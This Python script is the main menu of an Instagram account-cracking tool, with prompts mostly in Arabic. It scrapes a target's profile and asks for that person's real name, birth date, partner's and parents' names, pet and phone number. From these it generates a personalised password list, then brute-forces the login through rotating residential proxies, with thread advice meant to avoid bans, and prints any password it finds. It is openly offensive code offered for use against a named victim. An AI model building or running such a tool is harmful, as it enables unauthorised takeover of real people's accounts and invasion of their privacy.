#!/usr/bin/env python3
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.banner import (
    C, G, M, R, RE, W, Y, console,
    show_banner, show_info_panel, show_menu, show_password_stats,
)
from core.brute_attacker import BruteAttacker
from core.config import DATA_DIR, OUTPUT_DIR, TARGET_PASSWORD_COUNT
from core.info_gather import InstagramInfoGatherer
from core.password_engine import PasswordEngine
from core.proxy_rotator import ProxyRotator


def collect_personal_info(username):
    """مرحلة 2: معلومات كثيرة لتوليد كلمات السر"""
    print(f"\n{M}╔══════════════════════════════════════════╗{RE}")
    print(f"{M}║   PERSONAL INFO — كلما زدتْ تحسّنت اللائحة   ║{RE}")
    print(f"{M}╚══════════════════════════════════════════╝{RE}")
    print(f"{Y}Target: @{username} | Enter = تخطي السؤال{RE}\n")

    info = {
        "real_name": "",
        "birth_date": "",
        "birth_day": "",
        "birth_month": "",
        "birth_year": "",
        "city": "",
        "country": "",
        "school": "",
        "girlfriend_name": "",
        "pet_name": "",
        "favorite_thing": "",
        "nickname": "",
        "phone_number": "",
        "mother_name": "",
        "father_name": "",
        "job": "",
        "additional_words": [],
    }

    info["real_name"] = input(f"{C}[?] الاسم الحقيقي الكامل: {W}").strip()
    info["nickname"] = input(f"{C}[?] اللقب / كنية: {W}").strip()
    info["birth_date"] = input(f"{C}[?] تاريخ الازدياد (DD/MM/YYYY): {W}").strip()
    if not info["birth_date"]:
        info["birth_day"] = input(f"{C}[?] يوم الازدياد (DD): {W}").strip()
        info["birth_month"] = input(f"{C}[?] شهر الازدياد (MM): {W}").strip()
        info["birth_year"] = input(f"{C}[?] سنة الازدياد (YYYY): {W}").strip()
    info["city"] = input(f"{C}[?] المدينة: {W}").strip()
    info["country"] = input(f"{C}[?] البلد: {W}").strip()
    info["school"] = input(f"{C}[?] المدرسة / الجامعة: {W}").strip()
    info["job"] = input(f"{C}[?] العمل / الفريق: {W}").strip()
    info["girlfriend_name"] = input(f"{C}[?] اسم الشريك/الشريكة: {W}").strip()
    info["mother_name"] = input(f"{C}[?] اسم الأم: {W}").strip()
    info["father_name"] = input(f"{C}[?] اسم الأب: {W}").strip()
    info["pet_name"] = input(f"{C}[?] اسم حيوان أليف: {W}").strip()
    info["favorite_thing"] = input(f"{C}[?] شيء مفضل (فريق/لعبة/فنان): {W}").strip()
    info["phone_number"] = input(f"{C}[?] رقم الهاتف: {W}").strip()
    extra = input(f"{C}[?] كلمات إضافية (مفصولة بفاصلة): {W}").strip()
    if extra:
        info["additional_words"] = [x.strip() for x in extra.split(",") if x.strip()]

    # دمج المدينة/المدرسة ككلمات إضافية
    for k in ("city", "country", "school", "job", "mother_name", "father_name"):
        if info.get(k):
            info["additional_words"].append(info[k])

    return info


def _gatherer():
    pr = ProxyRotator()
    return InstagramInfoGatherer(
        proxy=pr.get_next_proxy() if pr.proxies else None,
        proxy_list=pr.list_proxies(),
    )


def mode_full_attack():
    """المسار الكامل: 1 فحص → 2 أسئلة → 3 هجوم"""
    show_banner()
    print(f"\n{G}═══ FULL ATTACK: 3 STAGES ═══{RE}")
    username = input(f"\n{C}[?] Instagram username: {W}@").strip().lstrip("@")
    if not username:
        print(f"{R}[!] username required{RE}")
        return

    # —— مرحلة 1 ——
    print(f"\n{C}[STAGE 1/3] Profile intelligence...{RE}")
    data = _gatherer().extract_profile_data(username)
    show_info_panel(username, data)
    if not data.get("fetch_ok") and not data.get("full_name"):
        print(f"{Y}[!] الجلب فشل/ناقص — دخل معلومات يدوياً في المرحلة 2{RE}")

    # —— مرحلة 2 ——
    print(f"\n{C}[STAGE 2/3] Personal info + password generation...{RE}")
    personal = collect_personal_info(username)
    engine = PasswordEngine(target_data=data, personal_info=personal)
    try:
        count = int(
            input(f"{C}[?] عدد كلمات السر [{TARGET_PASSWORD_COUNT}]: {W}").strip()
            or str(TARGET_PASSWORD_COUNT)
        )
    except ValueError:
        count = TARGET_PASSWORD_COUNT

    print(f"{Y}[*] Generating {count} passwords...{RE}")
    passwords = engine.generate_passwords(target_count=count)
    show_password_stats(passwords)

    os.makedirs(os.path.join(DATA_DIR, "wordlists"), exist_ok=True)
    wl = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
    with open(wl, "w", encoding="utf-8") as f:
        f.write("\n".join(passwords) + "\n")
    print(f"{G}[+] Wordlist: {wl}{RE}")

    # —— مرحلة 3 ——
    print(f"\n{C}[STAGE 3/3] Brute force with proxy/API rotation...{RE}")
    go = input(f"{C}[?] تبدأ الهجوم؟ (yes/no): {W}").strip().lower()
    if go not in ("y", "yes"):
        return
    try:
        threads = int(input(f"{C}[?] Threads 1-3 (1 أفضل ضد الحظر): {W}").strip() or "1")
    except ValueError:
        threads = 1

    found = BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=threads)
    if found:
        print(f"\n{G}USERNAME: {username}{RE}")
        print(f"{G}PASSWORD: {found}{RE}")


def mode_info_gathering():
    show_banner()
    username = input(f"\n{C}[?] username: {W}@").strip().lstrip("@")
    if not username:
        return
    data = _gatherer().extract_profile_data(username)
    show_info_panel(username, data)


def mode_password_generation():
    show_banner()
    username = input(f"\n{C}[?] username: {W}@").strip().lstrip("@")
    if not username:
        return
    data = {"username": username}
    if input(f"{C}[?] fetch profile? y/n: {W}").strip().lower() in ("y", "yes", ""):
        data = _gatherer().extract_profile_data(username)
        show_info_panel(username, data)
    personal = collect_personal_info(username)
    passwords = PasswordEngine(data, personal).generate_passwords()
    show_password_stats(passwords)
    path = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(passwords) + "\n")
    print(f"{G}[+] {path}{RE}")


def mode_brute_force_only():
    show_banner()
    username = input(f"\n{C}[?] username: {W}@").strip().lstrip("@")
    wl = input(f"{C}[?] wordlist path: {W}").strip()
    if not username or not os.path.isfile(wl):
        print(f"{R}[!] username + wordlist مطلوبين{RE}")
        return
    with open(wl, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [ln.strip() for ln in f if ln.strip()]
    print(f"{G}[+] {len(passwords)} passwords{RE}")
    if input(f"{C}[?] start? yes/no: {W}").strip().lower() not in ("y", "yes"):
        return
    BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=1)


def mode_proxy_config():
    show_banner()
    pr = ProxyRotator()
    while True:
        print(f"\n{M}[ PROXIES: {len(pr.proxies)} ]{RE}")
        print(f"{C}[1] list  [2] add  [3] remove  [4] import file  [0] back{RE}")
        c = input(f"{Y}? {W}").strip()
        if c == "1":
            for i, p in enumerate(pr.proxies, 1):
                print(f"  {i}. {p}")
            if not pr.proxies:
                print(f"{Y}empty — زيد residential proxies{RE}")
        elif c == "2":
            pr.add_proxy(input(f"{C}proxy: {W}").strip())
        elif c == "3":
            try:
                i = int(input("num: ")) - 1
                pr.remove_proxy(pr.proxies[i])
            except Exception:
                print(f"{R}invalid{RE}")
        elif c == "4":
            fp = input("file: ").strip()
            if os.path.isfile(fp):
                with open(fp, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            pr.add_proxy(line)
        elif c == "0":
            break


def mode_view_results():
    show_banner()
    if not os.path.isdir(OUTPUT_DIR):
        print(f"{Y}no results{RE}")
        return
    for fname in os.listdir(OUTPUT_DIR):
        if not fname.endswith(".json"):
            continue
        with open(os.path.join(OUTPUT_DIR, fname), encoding="utf-8") as f:
            try:
                d = json.load(f)
                print(f"\n{C}{fname}{RE} found={d.get('found')} pass={d.get('correct_password')}")
            except Exception:
                pass


def main():
    try:
        while True:
            show_banner()
            show_menu()
            choice = input().strip()
            if choice == "1":
                mode_info_gathering()
            elif choice == "2":
                mode_password_generation()
            elif choice == "3":
                mode_full_attack()
            elif choice == "4":
                mode_brute_force_only()
            elif choice == "5":
                mode_proxy_config()
            elif choice == "6":
                mode_view_results()
            elif choice == "7":
                from core import config
                print(f"ROTATE_EVERY={config.ROTATE_EVERY} TARGET={config.TARGET_PASSWORD_COUNT}")
            elif choice == "0":
                sys.exit(0)
            if choice in set("123467"):
                input(f"\n{Y}Enter...{RE}")
    except KeyboardInterrupt:
        print(f"\n{G}bye{RE}")
        sys.exit(0)


if __name__ == "__main__":
    main()
